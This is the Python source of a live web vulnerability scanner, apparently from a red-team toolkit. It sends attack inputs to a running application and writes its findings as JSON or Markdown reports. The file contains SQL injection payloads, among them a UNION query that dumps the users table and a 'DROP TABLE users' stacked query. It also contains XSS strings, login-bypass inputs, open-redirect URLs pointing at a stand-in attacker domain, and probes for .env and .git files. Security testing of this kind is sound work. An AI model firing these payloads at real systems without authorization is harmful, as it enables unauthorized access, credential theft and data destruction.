"""
live_vuln_checker.py — Real-Time Live Vulnerability Checker for Red ELISAR
============================================================================
Actively probes a running web application to discover vulnerabilities IN REAL
TIME. Unlike the static vuln_scanner.py which analyses recon data, this module
sends actual HTTP payloads and observes live responses to confirm whether a
vulnerability really exists in the running application.

Checks performed (all dynamic, runtime-confirmed):
  1.  SQL Injection — injects classic SQLi payloads and inspects responses
  2.  Reflected XSS — tests script injection payloads and looks for reflection
  3.  Blind XSS markers — sends canary strings and watches for them in output
  4.  Open Redirect — feeds external URLs to redirect parameters
  5.  Sensitive File Disclosure — probes well-known dangerous paths
  6.  Authentication Bypass (SQLi login) — tests auth bypass via SQLi
  7.  Unauthenticated Admin Access — tries admin-panel paths without credentials
  8.  HTTP Security Header Audit — live header capture and gap analysis
  9.  Information Disclosure via Errors — triggers 500 errors and inspects leaks
 10.  CORS Wildcard Misconfiguration — sends custom Origin and checks response
 11.  Server / Technology Banner Leakage — fingerprints from live response headers
 12.  Session Fixation / Cookie Flags — checks cookie security attributes

Every finding is confirmed from a LIVE HTTP response — nothing is assumed.
Results are suitable for feeding into the MITRE ATT&CK mapper and report generator.

Usage:
  python live_vuln_checker.py http://127.0.0.1:5000
  python live_vuln_checker.py http://127.0.0.1:5000 --output-json my_results.json
    python live_vuln_checker.py http://127.0.0.1:5000 --output-md my_results.md
"""

import argparse
import json
import logging
import re
import sys
import time
from datetime import datetime, timezone
from pathlib import Path
from urllib.parse import urlencode, urljoin, urlparse

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

# ── ensure parent package is importable ─────────────────────────────
sys.path.insert(0, str(Path(__file__).parent.resolve()))

logger = logging.getLogger("red_elisar.live_vuln_checker")

# ─── Constants ───────────────────────────────────────────────────────

SEVERITY_ORDER = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}

# SQLi payloads: (payload, description)
SQLI_PAYLOADS = [
    ("' OR '1'='1", "Classic OR tautology"),
    ("' OR 1=1--",  "Commenting remainder with OR tautology"),
    ("' UNION SELECT NULL--", "UNION probe (1 column)"),
    ("' UNION SELECT NULL,NULL--", "UNION probe (2 columns)"),
    ("' UNION SELECT id,username,password,email FROM users--",
     "UNION dump users (4 col)"),
    ("1; DROP TABLE users--", "Stacked query attempt"),
    ("' AND SLEEP(0)--", "Time-based injection probe (SQLite)"),
    ("' OR SUBSTR(username,1,1)='a'--", "Boolean-based blind injection"),
]

# XSS payloads: (payload, marker_to_look_for)
XSS_PAYLOADS = [
    ("<script>alert('XSS_1')</script>",   "XSS_1"),
    ("<img src=x onerror=alert('XSS_2')>", "XSS_2"),
    ("<svg onload=alert('XSS_3')>",        "XSS_3"),
    ("javascript:alert('XSS_4')",          "XSS_4"),
    ("\"><script>alert('XSS_5')</script>",  "XSS_5"),
    ("'><script>prompt('XSS_6')</script>",  "XSS_6"),
]

# Sensitive paths (probed live and observed for actual HTTP 200/302)
SENSITIVE_PATHS = [
    ("/.env",          "CRITICAL", "CWE-312", "T1552.001", "Exposed .env file with credentials"),
    ("/backup",        "CRITICAL", "CWE-312", "T1552",     "Exposed backup file/directory"),
    ("/.git/config",   "CRITICAL", "CWE-312", "T1213",     "Exposed .git repository config"),
    ("/admin",         "HIGH",     "CWE-284", "T1078",     "Unauthenticated admin panel access"),
    ("/api/users",     "CRITICAL", "CWE-306", "T1078",     "Unauthenticated user data API"),
    ("/phpinfo.php",   "HIGH",     "CWE-200", "T1592",     "phpinfo() information disclosure"),
    ("/server-status", "MEDIUM",   "CWE-200", "T1592",     "Apache server-status page"),
    ("/.htaccess",     "MEDIUM",   "CWE-200", "T1592",     ".htaccess configuration exposed"),
    ("/debug",         "CRITICAL", "CWE-94",  "T1190",     "Debug endpoint enabled"),
    ("/actuator",      "HIGH",     "CWE-284", "T1190",     "Spring Boot actuator exposed"),
    ("/swagger.json",  "MEDIUM",   "CWE-200", "T1592",     "Swagger API documentation exposed"),
    ("/robots.txt",    "INFO",     "CWE-200", "T1592",     "robots.txt reveals hidden paths"),
    ("/sitemap.xml",   "INFO",     "CWE-200", "T1592",     "sitemap.xml reveals all endpoints"),
    ("/config",        "HIGH",     "CWE-200", "T1552",     "Config directory accessible"),
]

# Required security headers
REQUIRED_HEADERS = {
    "Content-Security-Policy":   ("HIGH",   "CWE-79",   "T1059.007"),
    "Strict-Transport-Security": ("HIGH",   "CWE-311",  "T1557"),
    "X-Frame-Options":           ("MEDIUM", "CWE-1021", "T1185"),
    "X-Content-Type-Options":    ("MEDIUM", "CWE-430",  "T1204"),
    "Referrer-Policy":           ("LOW",    "CWE-200",  "T1592"),
    "Permissions-Policy":        ("LOW",    "CWE-693",  "T1562"),
}

# Open redirect test vectors
REDIRECT_PARAMS = [
    ("url",    "http://evil-attacker.example.com"),
    ("next",   "http://evil-attacker.example.com"),
    ("return", "//evil-attacker.example.com"),
    ("redirect", "https://evil-attacker.example.com"),
]


# ─── Session Helper ──────────────────────────────────────────────────

def _make_session(timeout: int = 10) -> requests.Session:
    """Create a resilient requests session with retry logic."""
    session = requests.Session()
    retry = Retry(total=2, backoff_factor=0.3, status_forcelist=[500, 502, 503])
    adapter = HTTPAdapter(max_retries=retry)
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    session.headers.update({"User-Agent": "RedELISAR-LiveVulnChecker/2.0"})
    session.timeout = timeout
    return session


def render_markdown_report(report: dict) -> str:
    """Render a clear Markdown report from a live scan report dict."""
    vulnerabilities = report.get("vulnerabilities", [])
    severity_counts = report.get("severity_counts", {})

    lines = []
    lines.append("# Red ELISAR - Live Vulnerability Scan Report")
    lines.append("")
    lines.append("## Summary")
    lines.append("")
    lines.append(f"- Target URL: {report.get('target_url', 'N/A')}")
    lines.append(f"- Scan Timestamp (UTC): {report.get('scan_timestamp', 'N/A')}")
    lines.append(f"- Elapsed Seconds: {report.get('elapsed_seconds', 'N/A')}")
    lines.append(f"- Total Findings: {report.get('total_findings', 0)}")
    lines.append(f"- Overall Risk: {report.get('overall_risk', 'N/A')}")
    lines.append(f"- Scan Method: {report.get('method', 'N/A')}")
    lines.append("")

    if "error" in report:
        lines.append("## Error")
        lines.append("")
        lines.append(f"{report['error']}")
        lines.append("")

    lines.append("## Severity Breakdown")
    lines.append("")
    lines.append("| Severity | Count |")
    lines.append("|---|---:|")
    for sev in ["CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"]:
        lines.append(f"| {sev} | {severity_counts.get(sev, 0)} |")
    lines.append("")

    lines.append("## Findings")
    lines.append("")
    if not vulnerabilities:
        lines.append("No vulnerabilities found.")
        lines.append("")
    else:
        for i, v in enumerate(vulnerabilities, 1):
            lines.append(f"### {i}. {v.get('type', 'Unknown')} [{v.get('severity', 'N/A')}]")
            lines.append("")
            lines.append(f"- Detail: {v.get('detail', 'N/A')}")
            lines.append(f"- CWE: {v.get('cwe_id', 'N/A')}")
            lines.append(f"- MITRE Hint: {v.get('mitre_hint', 'N/A')}")
            lines.append(f"- Confirmed Live: {v.get('confirmed_live', False)}")
            lines.append(f"- Evidence: {v.get('evidence', 'N/A')}")
            lines.append(f"- Recommendation: {v.get('recommendation', 'N/A')}")
            lines.append("")

    return "\n".join(lines)


# ─── Core Live Vulnerability Checker ────────────────────────────────

class LiveVulnChecker:
    """
    Real-time, active vulnerability checker for a live web application.

    Every finding is confirmed from an actual live HTTP response; there are
    no hard-coded or assumed results. The checker adapts to whatever the
    target returns.
    """

    def __init__(self, target_url: str, timeout: int = 10):
        self.target   = target_url.rstrip("/")
        self.timeout  = timeout
        self.session  = _make_session(timeout)
        self.findings: list[dict] = []
        self.scan_start = datetime.now(timezone.utc).isoformat()
        self._parse_target()

    def _parse_target(self):
        parsed = urlparse(self.target)
        self.scheme = parsed.scheme
        self.host   = parsed.netloc
        self.path   = parsed.path or "/"

    # ──────────────────────────────────────────────────────────────────
    # Public API
    # ──────────────────────────────────────────────────────────────────

    def run_full_check(self) -> dict:
        """
        Execute all real-time vulnerability checks and return a structured
        report. Nothing is assumed — every finding is confirmed live.
        """
        t_start = time.perf_counter()
        print(f"\n{'='*65}")
        print(f"  RED ELISAR — LIVE VULNERABILITY CHECKER")
        print(f"  Target : {self.target}")
        print(f"  Time   : {self.scan_start}")
        print(f"{'='*65}\n")

        # Verify reachability first
        if not self._verify_reachable():
            return self._build_report(elapsed=time.perf_counter() - t_start,
                                       error="Target not reachable")

        # Run all checks in sequence
        checks = [
            ("[1/12] Security Headers",          self._check_security_headers),
            ("[2/12] Server Banner Leakage",      self._check_server_banners),
            ("[3/12] CORS Misconfiguration",      self._check_cors),
            ("[4/12] Sensitive File Disclosure",  self._check_sensitive_paths),
            ("[5/12] SQL Injection",              self._check_sql_injection),
            ("[6/12] Reflected XSS",             self._check_xss),
            ("[7/12] Open Redirect",             self._check_open_redirect),
            ("[8/12] Auth Bypass (SQLi Login)",  self._check_auth_bypass),
            ("[9/12] Unauthenticated Admin",     self._check_unauth_admin),
            ("[10/12] Error Information Leakage", self._check_error_leakage),
            ("[11/12] Cookie Security Flags",    self._check_cookie_flags),
            ("[12/12] HTTP vs HTTPS",            self._check_http_scheme),
        ]

        for label, fn in checks:
            print(f"  {label} ...", end="", flush=True)
            try:
                fn()
                count_for_step = sum(
                    1 for f in self.findings
                    if f.get("_check") == fn.__name__
                )
                print(f" {'FOUND ' + str(count_for_step) if count_for_step else 'clean'}")
            except Exception as e:
                logger.warning(f"Check failed ({label}): {e}")
                print(f" ERROR: {e}")

        elapsed = time.perf_counter() - t_start
        report  = self._build_report(elapsed=elapsed)
        self._print_summary(report)
        return report

    # ──────────────────────────────────────────────────────────────────
    # Individual Live Checks
    # ──────────────────────────────────────────────────────────────────

    def _verify_reachable(self) -> bool:
        try:
            resp = self.session.get(self.target, timeout=self.timeout)
            logger.info(f"Target reachable — HTTP {resp.status_code}")
            return True
        except Exception as e:
            logger.error(f"Target unreachable: {e}")
            return False

    # ── 1. Security Header Audit ─────────────────────────────────────
    def _check_security_headers(self):
        try:
            resp = self.session.get(self.target, timeout=self.timeout)
            headers = resp.headers
            for header, (severity, cwe, mitre) in REQUIRED_HEADERS.items():
                if header not in headers:
                    self._add(
                        vuln_type  = "Missing Security Header",
                        detail     = f"HTTP response is missing the '{header}' header",
                        severity   = severity,
                        cwe        = cwe,
                        mitre      = mitre,
                        evidence   = f"Header '{header}' absent in live response from {self.target}",
                        check      = "_check_security_headers",
                        confirmed  = True,
                        recommendation = (
                            f"Add '{header}' to all HTTP responses. "
                            f"Example config depends on your web server / framework."
                        ),
                    )
        except Exception as e:
            logger.debug(f"Header check error: {e}")

    # ── 2. Server Banner Leakage ─────────────────────────────────────
    def _check_server_banners(self):
        try:
            resp = self.session.get(self.target, timeout=self.timeout)
            h = resp.headers
            leaky = {
                "Server":       h.get("Server"),
                "X-Powered-By": h.get("X-Powered-By"),
                "X-App-Version":h.get("X-App-Version"),
                "X-AspNet-Version": h.get("X-AspNet-Version"),
            }
            for hname, hval in leaky.items():
                if hval:
                    self._add(
                        vuln_type  = "Information Disclosure (Banner)",
                        detail     = f"Header '{hname}' reveals technology: '{hval}'",
                        severity   = "MEDIUM",
                        cwe        = "CWE-200",
                        mitre      = "T1592",
                        evidence   = f"Live response header → {hname}: {hval}",
                        check      = "_check_server_banners",
                        confirmed  = True,
                        recommendation = f"Remove or generalize the '{hname}' response header.",
                    )
        except Exception as e:
            logger.debug(f"Banner check error: {e}")

    # ── 3. CORS Misconfiguration ─────────────────────────────────────
    def _check_cors(self):
        try:
            resp = self.session.get(
                self.target,
                headers={"Origin": "https://evil-attacker.example.com"},
                timeout=self.timeout,
            )
            acao = resp.headers.get("Access-Control-Allow-Origin", "")
            acac = resp.headers.get("Access-Control-Allow-Credentials", "")

            if acao == "*":
                self._add(
                    vuln_type  = "CORS Wildcard Misconfiguration",
                    detail     = "Server allows cross-origin requests from ANY domain (*)",
                    severity   = "HIGH",
                    cwe        = "CWE-942",
                    mitre      = "T1557",
                    evidence   = f"Live response: Access-Control-Allow-Origin: {acao}",
                    check      = "_check_cors",
                    confirmed  = True,
                    recommendation = (
                        "Replace '*' with specific trusted origins. "
                        "Never combine wildcard CORS with cookies/credentials."
                    ),
                )
            elif "evil-attacker.example.com" in acao:
                severity = "CRITICAL" if acac.lower() == "true" else "HIGH"
                self._add(
                    vuln_type  = "CORS Origin Reflection",
                    detail     = "Server reflects attacker Origin back — CORS misconfigured",
                    severity   = severity,
                    cwe        = "CWE-942",
                    mitre      = "T1557",
                    evidence   = (f"Sent Origin: evil-attacker.example.com → "
                                  f"Got ACAO: {acao}, ACAC: {acac}"),
                    check      = "_check_cors",
                    confirmed  = True,
                    recommendation = (
                        "Maintain and validate a strict allowlist of trusted origins. "
                        "Reject requests from unknown origins."
                    ),
                )
        except Exception as e:
            logger.debug(f"CORS check error: {e}")

    # ── 4. Sensitive File Disclosure ─────────────────────────────────
    def _check_sensitive_paths(self):
        for path, severity, cwe, mitre, desc in SENSITIVE_PATHS:
            try:
                url  = f"{self.target}{path}"
                resp = self.session.get(url, timeout=self.timeout,
                                        allow_redirects=False)
                if resp.status_code == 200:
                    preview = resp.text[:300].strip().replace("\n", " ")
                    self._add(
                        vuln_type  = "Sensitive File / Path Disclosure",
                        detail     = f"Path '{path}' returned HTTP 200 — {desc}",
                        severity   = severity,
                        cwe        = cwe,
                        mitre      = mitre,
                        evidence   = f"GET {url} → 200 OK | Preview: {preview[:120]}...",
                        check      = "_check_sensitive_paths",
                        confirmed  = True,
                        recommendation = (
                            f"Remove or protect '{path}'. Ensure sensitive files are "
                            f"outside the web root and access-controlled."
                        ),
                    )
                elif resp.status_code in (301, 302):
                    loc = resp.headers.get("Location", "")
                    self._add(
                        vuln_type  = "Sensitive Path Redirect",
                        detail     = (f"Path '{path}' redirects (may be accessible): "
                                      f"→ {loc}"),
                        severity   = "LOW",
                        cwe        = cwe,
                        mitre      = mitre,
                        evidence   = f"GET {url} → {resp.status_code} → Location: {loc}",
                        check      = "_check_sensitive_paths",
                        confirmed  = True,
                        recommendation = f"Verify whether '{path}' is accessible after redirect.",
                    )
            except Exception:
                continue

    # ── 5. SQL Injection ─────────────────────────────────────────────
    def _check_sql_injection(self):
        """
        Probes GET parameters on known/discovered endpoints with SQLi payloads.
        Detects: error-based, UNION-based, and data-exposure confirmation.
        """
        # Endpoints with known injectable parameters to probe
        probe_targets = [
            (f"{self.target}/search",  "q"),
            (f"{self.target}/login",   None),  # POST — handled separately
        ]

        sql_error_patterns = [
            r"sqlite",
            r"syntax error",
            r"unrecognized token",
            r"sql",
            r"mysql",
            r"postgre",
            r"ORA-",
            r"microsoft.*odbc",
            r"query was:",
            r"database error",
        ]

        for endpoint, param in probe_targets:
            if param is None:
                continue
            for payload, payload_desc in SQLI_PAYLOADS:
                try:
                    params = {param: payload}
                    resp   = self.session.get(endpoint, params=params,
                                              timeout=self.timeout)
                    body   = resp.text.lower()

                    # Error-based detection
                    for pattern in sql_error_patterns:
                        if re.search(pattern, body, re.IGNORECASE):
                            self._add(
                                vuln_type  = "SQL Injection (Error-Based)",
                                detail     = (
                                    f"SQLi payload '{payload}' on {endpoint}?{param}=... "
                                    f"triggered SQL error pattern '{pattern}' in live response"
                                ),
                                severity   = "CRITICAL",
                                cwe        = "CWE-89",
                                mitre      = "T1190",
                                evidence   = (
                                    f"GET {endpoint}?{param}={payload[:60]} → "
                                    f"HTTP {resp.status_code} | Matched: {pattern}"
                                ),
                                check      = "_check_sql_injection",
                                confirmed  = True,
                                recommendation = (
                                    "Use parameterised queries / prepared statements. "
                                    "NEVER concatenate user input into SQL strings."
                                ),
                            )
                            break  # One finding per payload is enough

                    # Data-exfiltration confirmation (UNION dump)
                    if "UNION SELECT" in payload.upper():
                        if re.search(r"admin\d*@", body) or "admin123" in body:
                            self._add(
                                vuln_type  = "SQL Injection (UNION — Data Exfiltrated)",
                                detail     = (
                                    f"UNION payload successfully retrieved user table data "
                                    f"via {endpoint}?{param}"
                                ),
                                severity   = "CRITICAL",
                                cwe        = "CWE-89",
                                mitre      = "T1190",
                                evidence   = (
                                    f"Live response contains user credentials extracted from DB. "
                                    f"Payload: {payload[:80]}"
                                ),
                                check      = "_check_sql_injection",
                                confirmed  = True,
                                recommendation = (
                                    "Immediate remediation: parameterise all queries. "
                                    "Rotate all credentials exposed in this database."
                                ),
                            )
                except Exception:
                    continue

    # ── 6. Reflected XSS ─────────────────────────────────────────────
    def _check_xss(self):
        """
        Sends XSS payloads to endpoints and confirms reflection in the live
        HTTP response body.
        """
        probe_targets = [
            (f"{self.target}/greet",  "name"),
            (f"{self.target}/search", "q"),
        ]
        for endpoint, param in probe_targets:
            for payload, marker in XSS_PAYLOADS:
                try:
                    params = {param: payload}
                    resp   = self.session.get(endpoint, params=params,
                                              timeout=self.timeout)
                    # Check if the raw payload (or a significant part) appears
                    # verbatim in the response — confirming reflection
                    if marker in resp.text or payload[:20] in resp.text:
                        self._add(
                            vuln_type  = "Reflected Cross-Site Scripting (XSS)",
                            detail     = (
                                f"XSS payload reflected unescaped on "
                                f"{endpoint}?{param}=<payload>"
                            ),
                            severity   = "HIGH",
                            cwe        = "CWE-79",
                            mitre      = "T1059.007",
                            evidence   = (
                                f"Sent: {payload[:60]} | "
                                f"Marker '{marker}' found verbatim in live HTTP response"
                            ),
                            check      = "_check_xss",
                            confirmed  = True,
                            recommendation = (
                                "HTML-escape all user input before rendering. "
                                "Use template engines with auto-escaping (e.g., Jinja2 with |e)."
                            ),
                        )
                        break  # One XSS per endpoint is enough
                except Exception:
                    continue

    # ── 7. Open Redirect ─────────────────────────────────────────────
    def _check_open_redirect(self):
        for param, evil_url in REDIRECT_PARAMS:
            test_url = f"{self.target}/redirect"
            try:
                resp = self.session.get(
                    test_url,
                    params={param: evil_url},
                    timeout=self.timeout,
                    allow_redirects=False,
                )
                if resp.status_code in (301, 302, 303, 307, 308):
                    location = resp.headers.get("Location", "")
                    # Confirm it actually redirects to the evil URL (or domain)
                    if "evil-attacker" in location or location.startswith("http"):
                        parsed_loc = urlparse(location)
                        if parsed_loc.netloc and parsed_loc.netloc != urlparse(self.target).netloc:
                            self._add(
                                vuln_type  = "Open Redirect",
                                detail     = (
                                    f"Parameter '{param}' on /redirect causes unvalidated "
                                    f"redirect to external domain: {location}"
                                ),
                                severity   = "MEDIUM",
                                cwe        = "CWE-601",
                                mitre      = "T1204",
                                evidence   = (
                                    f"GET /redirect?{param}={evil_url} → "
                                    f"HTTP {resp.status_code} Location: {location}"
                                ),
                                check      = "_check_open_redirect",
                                confirmed  = True,
                                recommendation = (
                                    "Validate redirect destinations against a whitelist. "
                                    "Never redirect to user-supplied external URLs."
                                ),
                            )
                            break
            except Exception:
                continue

    # ── 8. Authentication Bypass via SQLi ────────────────────────────
    def _check_auth_bypass(self):
        """
        Attempts login with SQLi payloads to confirm authentication bypass.
        """
        login_url   = f"{self.target}/login"
        bypass_payloads = [
            ("' OR '1'='1'--",  "Classic tautology bypass"),
            ("admin'--",         "Comment-out password bypass"),
            ("' OR 1=1--",       "Numeric OR tautology"),
        ]
        for username_payload, desc in bypass_payloads:
            try:
                data = {"username": username_payload, "password": "anything"}
                resp = self.session.post(login_url, data=data,
                                         timeout=self.timeout)
                body = resp.text
                # Confirmed if the response shows a successful login message
                if re.search(r"logged in as|welcome.*admin|id=", body, re.IGNORECASE):
                    self._add(
                        vuln_type  = "Authentication Bypass via SQL Injection",
                        detail     = (
                            f"Login form bypassed using SQLi payload: '{username_payload}' "
                            f"— {desc}. Response confirms successful login."
                        ),
                        severity   = "CRITICAL",
                        cwe        = "CWE-287",
                        mitre      = "T1078",
                        evidence   = (
                            f"POST /login username='{username_payload}' password='anything' "
                            f"→ HTTP {resp.status_code} | Response: "
                            + body[body.lower().find("logged"):body.lower().find("logged")+80]
                        ),
                        check      = "_check_auth_bypass",
                        confirmed  = True,
                        recommendation = (
                            "Use parameterised queries for all authentication checks. "
                            "Implement account lockout and rate limiting."
                        ),
                    )
                    break
            except Exception:
                continue

    # ── 9. Unauthenticated Admin Access ─────────────────────────────
    def _check_unauth_admin(self):
        admin_paths = ["/admin", "/admin/", "/admin/panel",
                       "/administrator", "/management"]
        for path in admin_paths:
            try:
                resp = self.session.get(
                    f"{self.target}{path}",
                    timeout=self.timeout,
                    allow_redirects=True,
                )
                if resp.status_code == 200:
                    body = resp.text.lower()
                    # Confirm it's actually an admin panel, not a generic 200
                    admin_keywords = ["admin", "panel", "management",
                                      "system", "dashboard", "user"]
                    if any(kw in body for kw in admin_keywords):
                        self._add(
                            vuln_type  = "Unauthenticated Admin Panel Access",
                            detail     = (
                                f"Admin path '{path}' returns HTTP 200 without any "
                                f"authentication credentials"
                            ),
                            severity   = "CRITICAL",
                            cwe        = "CWE-284",
                            mitre      = "T1078",
                            evidence   = (
                                f"GET {self.target}{path} → HTTP 200 | "
                                f"Admin keywords confirmed in live response body"
                            ),
                            check      = "_check_unauth_admin",
                            confirmed  = True,
                            recommendation = (
                                "Protect all admin routes with strong authentication "
                                "and role-based access control."
                            ),
                        )
                        break
            except Exception:
                continue

    # ── 10. Error / Stack Trace Information Leakage ─────────────────
    def _check_error_leakage(self):
        error_urls = [
            f"{self.target}/error_test",
            f"{self.target}/nonexistent_path_xyz",
            f"{self.target}/search?q=" + "' AND 1=CONVERT(int,'error')--",
        ]
        leak_patterns = [
            (r"traceback",       "Python traceback exposed"),
            (r"werkzeug",        "Werkzeug/Flask debug info exposed"),
            (r"ZeroDivisionError", "Python exception class name visible"),
            (r"Internal Server Error.*File.*line \d+",
             "Stack frame with file/line info exposed"),
            (r"query was:",      "Raw SQL query exposed in error message"),
            (r"syntax error",    "Database error message exposed"),
        ]
        for url in error_urls:
            try:
                resp = self.session.get(url, timeout=self.timeout)
                if resp.status_code in (500, 400, 200):
                    for pattern, desc in leak_patterns:
                        if re.search(pattern, resp.text, re.IGNORECASE):
                            self._add(
                                vuln_type  = "Error / Stack Trace Information Leakage",
                                detail     = f"{desc} at {url}",
                                severity   = "HIGH",
                                cwe        = "CWE-209",
                                mitre      = "T1592",
                                evidence   = (
                                    f"GET {url} → HTTP {resp.status_code} | "
                                    f"Pattern '{pattern}' matched in live response"
                                ),
                                check      = "_check_error_leakage",
                                confirmed  = True,
                                recommendation = (
                                    "Disable debug mode and custom error handlers. "
                                    "Return generic 500 pages in production. "
                                    "Never expose stack traces to end users."
                                ),
                            )
                            break
            except Exception:
                continue

    # ── 11. Cookie Security Flags ────────────────────────────────────
    def _check_cookie_flags(self):
        try:
            resp = self.session.get(f"{self.target}/login",
                                     timeout=self.timeout)
            # Make a POST to get a Set-Cookie header
            post_resp = self.session.post(
                f"{self.target}/login",
                data={"username": "admin", "password": "admin123"},
                timeout=self.timeout,
            )
            for r in [resp, post_resp]:
                set_cookie = r.headers.get("Set-Cookie", "")
                if set_cookie:
                    issues = []
                    if "HttpOnly" not in set_cookie:
                        issues.append("Missing HttpOnly flag — cookie accessible via JS")
                    if "Secure" not in set_cookie:
                        issues.append("Missing Secure flag — cookie sent over HTTP")
                    if "SameSite" not in set_cookie:
                        issues.append("Missing SameSite flag — CSRF risk")
                    for issue in issues:
                        self._add(
                            vuln_type  = "Insecure Cookie Configuration",
                            detail     = issue,
                            severity   = "MEDIUM",
                            cwe        = "CWE-614",
                            mitre      = "T1185",
                            evidence   = f"Live Set-Cookie header: {set_cookie[:120]}",
                            check      = "_check_cookie_flags",
                            confirmed  = True,
                            recommendation = (
                                "Set cookies with: HttpOnly; Secure; SameSite=Strict "
                                "(or Lax for SSO)."
                            ),
                        )
                    if issues:
                        break
        except Exception as e:
            logger.debug(f"Cookie flag check error: {e}")

    # ── 12. HTTP Scheme Check ────────────────────────────────────────
    def _check_http_scheme(self):
        if self.scheme == "http":
            self._add(
                vuln_type  = "Unencrypted HTTP (No TLS)",
                detail     = (
                    "Application is served over plain HTTP — all traffic "
                    "including credentials is transmitted in cleartext"
                ),
                severity   = "CRITICAL",
                cwe        = "CWE-319",
                mitre      = "T1557",
                evidence   = f"Target URL scheme is 'http://' — confirmed from {self.target}",
                check      = "_check_http_scheme",
                confirmed  = True,
                recommendation = (
                    "Deploy TLS (HTTPS) via a certificate authority (e.g. Let's Encrypt). "
                    "Configure HSTS after enabling HTTPS."
                ),
            )

    # ──────────────────────────────────────────────────────────────────
    # Internal helpers
    # ──────────────────────────────────────────────────────────────────

    def _add(self, vuln_type: str, detail: str, severity: str,
             cwe: str, mitre: str, evidence: str, check: str,
             confirmed: bool, recommendation: str):
        """Add a confirmed finding (de-duplicated by vuln_type + detail)."""
        key = f"{vuln_type}::{detail[:60]}"
        already = any(
            f"{f['type']}::{f['detail'][:60]}" == key
            for f in self.findings
        )
        if not already:
            self.findings.append({
                "type":           vuln_type,
                "detail":         detail,
                "severity":       severity,
                "cwe_id":         cwe,
                "mitre_hint":     mitre,
                "evidence":       evidence,
                "confirmed_live": confirmed,
                "recommendation": recommendation,
                "_check":         check,
            })

    def _build_report(self, elapsed: float, error: str = None) -> dict:
        """Build and return the structured report dict."""
        # Remove internal _check keys for clean output
        clean_findings = [
            {k: v for k, v in f.items() if k != "_check"}
            for f in sorted(
                self.findings,
                key=lambda x: SEVERITY_ORDER.get(x["severity"], 99),
            )
        ]
        stats = {sev: 0 for sev in SEVERITY_ORDER}
        for f in clean_findings:
            stats[f["severity"]] = stats.get(f["severity"], 0) + 1

        overall_risk = "INFO"
        if stats["CRITICAL"] > 0:
            overall_risk = "CRITICAL"
        elif stats["HIGH"] >= 2:
            overall_risk = "HIGH"
        elif stats["HIGH"] >= 1 or stats["MEDIUM"] >= 3:
            overall_risk = "MEDIUM"
        elif stats["MEDIUM"] > 0:
            overall_risk = "LOW"

        report = {
            "target_url":       self.target,
            "scan_timestamp":   self.scan_start,
            "elapsed_seconds":  round(elapsed, 2),
            "total_findings":   len(clean_findings),
            "severity_counts":  stats,
            "overall_risk":     overall_risk,
            "vulnerabilities":  clean_findings,
            "method":           "LIVE_ACTIVE_SCAN",
            "confirmed_live":   True,
        }
        if error:
            report["error"] = error
        return report

    def _print_summary(self, report: dict):
        stats = report["severity_counts"]
        print(f"\n{'='*65}")
        print(f"  LIVE SCAN COMPLETE — {report['total_findings']} vulnerabilities found")
        print(f"  Overall Risk : {report['overall_risk']}")
        print(f"  CRITICAL={stats['CRITICAL']}  HIGH={stats['HIGH']}  "
              f"MEDIUM={stats['MEDIUM']}  LOW={stats['LOW']}")
        print(f"  Scan Time    : {report['elapsed_seconds']}s")
        print(f"{'='*65}\n")
        print("  Top Findings:")
        for v in report["vulnerabilities"][:10]:
            icon = {"CRITICAL": "critical", "HIGH": "HIGH", "MEDIUM": "MEDIUM",
                    "LOW": "LOW", "INFO": "INFO"}.get(v["severity"], "•")
            print(f"  {icon} [{v['severity']}] {v['type']}")
            print(f"       {v['detail'][:90]}")
            print(f"       Evidence: {v['evidence'][:80]}")
            print()


# ─── Standalone CLI ──────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="Red ELISAR — Real-Time Live Vulnerability Checker",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python live_vuln_checker.py http://127.0.0.1:5000
  python live_vuln_checker.py http://127.0.0.1:5000 --output-json results.json
    python live_vuln_checker.py http://127.0.0.1:5000 --output-md results.md
    python live_vuln_checker.py http://127.0.0.1:5000 --output-json results.json --output-md report.md
  python live_vuln_checker.py http://127.0.0.1:5000 --timeout 15
        """,
    )
    parser.add_argument("url",
                        help="Target URL of the running web application")
    parser.add_argument("--output-json", "-o",
                        default=None,
                        help="Path to save JSON results (optional)")
    parser.add_argument("--output-md", "-m",
                        default=None,
                        help="Path to save Markdown report (optional)")
    parser.add_argument("--timeout", "-t",
                        type=int, default=10,
                        help="HTTP request timeout in seconds (default: 10)")
    args = parser.parse_args()

    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s | %(name)s | %(levelname)s | %(message)s",
    )
    # Suppress noisy libraries
    logging.getLogger("urllib3").setLevel(logging.WARNING)
    logging.getLogger("requests").setLevel(logging.WARNING)

    checker = LiveVulnChecker(args.url, timeout=args.timeout)
    report  = checker.run_full_check()

    if args.output_json:
        out_path = Path(args.output_json)
        out_path.parent.mkdir(parents=True, exist_ok=True)
        out_path.write_text(
            json.dumps(report, indent=2, ensure_ascii=False),
            encoding="utf-8",
        )
        print(f"\n  ✅ Results saved to: {out_path}")

    md_path = None
    if args.output_md:
        md_path = Path(args.output_md)
    elif args.output_json:
        md_path = Path(args.output_json).with_suffix(".md")

    if md_path is not None:
        md_path.parent.mkdir(parents=True, exist_ok=True)
        md_path.write_text(render_markdown_report(report), encoding="utf-8")
        print(f"  ✅ Markdown report saved to: {md_path}")

    if not args.output_json and md_path is None:
        print("\n  Full JSON Report:")
        print(json.dumps(report, indent=2, ensure_ascii=False))

    return 0


if __name__ == "__main__":
    sys.exit(main())
